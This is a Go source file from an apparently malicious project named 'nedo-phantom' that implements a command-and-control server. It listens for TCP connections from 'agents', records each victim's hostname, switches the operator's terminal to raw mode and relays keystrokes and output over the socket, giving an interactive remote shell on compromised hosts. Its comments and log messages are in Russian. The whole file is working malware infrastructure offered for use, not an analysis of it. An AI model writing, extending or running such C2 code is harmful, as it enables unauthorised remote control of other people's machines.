package server

import (
    "bufio"
    "fmt"
    "net"
    "strings"
    "syscall"
    "time"
    "unsafe"
    "os"
    
    "nedo-phantom/internal/c2/db"
)

type Server struct {
    addr   string
    tasks  *db.TaskQueue
    agents map[string]*AgentSession
}

type AgentSession struct {
    conn     net.Conn
    hostname string
    lastSeen time.Time
}

func NewServer(addr string) *Server {
    return &Server{
        addr:   addr,
        tasks:  db.NewTaskQueue(),
        agents: make(map[string]*AgentSession),
    }
}

func (s *Server) Run() error {
    listener, err := net.Listen("tcp", s.addr)
    if err != nil {
        return err
    }
    defer listener.Close()
    
    fmt.Printf("[C2] Server listening on %s\n", s.addr)
    
    for {
        conn, err := listener.Accept()
        if err != nil {
            fmt.Printf("Accept error: %v\n", err)
            continue
        }
        go s.handleAgent(conn)
    }
}

func (s *Server) handleAgent(conn net.Conn) {
    defer conn.Close()
    
    // Читаем hostname
    reader := bufio.NewReader(conn)
    firstLine, err := reader.ReadString('\n')
    if err != nil {
        fmt.Println("Ошибка чтения приветствия:", err)
        return
    }
    hostname := strings.TrimSpace(firstLine)
    fmt.Printf("[+] Агент подключился: %s\n", hostname)
    
    // Сохраняем сессию
    s.agents[hostname] = &AgentSession{
        conn:     conn,
        hostname: hostname,
        lastSeen: time.Now(),
    }
    
    // Сохраняем оригинальные настройки терминала
    fd := os.Stdin.Fd()
    var originalTermios syscall.Termios
    syscall.Syscall(syscall.SYS_IOCTL, fd, syscall.TCGETS, uintptr(unsafe.Pointer(&originalTermios)))
    
    // Переводим терминал сервера в raw-режим
    s.setRawTerminal()
    
    // Интерактивный режим
    s.interactiveMode(conn)
    
    // Восстанавливаем терминал
    s.resetTerminal(originalTermios)
    
    // Удаляем сессию
    delete(s.agents, hostname)
    fmt.Printf("[+] Сессия с агентом %s завершена\n", hostname)
}

func (s *Server) setRawTerminal() error {
    fd := os.Stdin.Fd()
    var termios syscall.Termios
    _, _, errno := syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TCGETS,
        uintptr(unsafe.Pointer(&termios)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка TCGETS: %v", errno)
    }
    
    termios.Lflag &^= syscall.ECHO | syscall.ICANON | syscall.ISIG
    termios.Iflag &^= syscall.IXON | syscall.ICRNL
    termios.Oflag &^= syscall.OPOST
    termios.Cflag |= syscall.CS8
    
    _, _, errno = syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TCSETS,
        uintptr(unsafe.Pointer(&termios)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка TCSETS: %v", errno)
    }
    return nil
}

func (s *Server) resetTerminal(originalTermios syscall.Termios) error {
    fd := os.Stdin.Fd()
    _, _, errno := syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TCSETS,
        uintptr(unsafe.Pointer(&originalTermios)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка восстановления терминала: %v", errno)
    }
    return nil
}

func (s *Server) interactiveMode(conn net.Conn) {
    conn.SetReadDeadline(time.Time{})
    done := make(chan bool)
    
    // Сокет -> stdout
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := conn.Read(buf)
            if n > 0 {
                if _, writeErr := os.Stdout.Write(buf[:n]); writeErr != nil {
                    done <- true
                    return
                }
            }
            if err != nil {
                done <- true
                return
            }
        }
    }()
    
    // stdin -> сокет
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := os.Stdin.Read(buf)
            if n > 0 {
                if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
                    done <- true
                    return
                }
            }
            if err != nil {
                done <- true
                return
            }
        }
    }()
    
    <-done
    fmt.Println("\n[+] Выход из интерактивного режима")
    conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}
